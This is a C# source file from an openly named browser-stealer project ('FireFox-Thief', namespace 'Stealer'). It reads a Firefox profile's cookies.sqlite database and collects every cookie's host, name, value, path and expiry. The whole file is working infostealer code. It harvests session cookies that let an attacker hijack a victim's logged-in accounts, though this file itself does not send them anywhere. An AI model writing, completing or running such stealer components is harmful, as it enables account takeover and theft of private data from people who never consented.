/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/FireFox-Thief
*/

using System.IO;
using System.Collections.Generic;
using Stealer.Helpers;
using static Stealer.Helpers.Common;

namespace Stealer.Reader
{
    internal sealed class Cookies
    {        
        // Get cookies from gecko browser
        public static List<Cookie> Get(string BrowserDir)
        {
            List<Cookie> lcCookies = new List<Cookie>();
            // Get firefox default profile directory
            string profile = Profile.GetProfile(BrowserDir);
            // Read cookies from file
            if (profile == null) return lcCookies;
            string db_location = Path.Combine(profile, "cookies.sqlite");
            // Read data from table
            SQLite sSQLite = SQLite.ReadTable(db_location, "moz_cookies");
            if (sSQLite == null) return lcCookies;
            // Get values from table
            for (int i = 0; i < sSQLite.GetRowCount(); i++)
            {
                Cookie cCookie = new Cookie();
                cCookie.sHostKey = sSQLite.GetValue(i, 4);
                cCookie.sName = sSQLite.GetValue(i, 2);
                cCookie.sValue = sSQLite.GetValue(i, 3);
                cCookie.sPath = sSQLite.GetValue(i, 5);
                cCookie.sExpiresUtc = sSQLite.GetValue(i, 6);

                lcCookies.Add(cCookie);
            }

            return lcCookies;
        }
    }
}
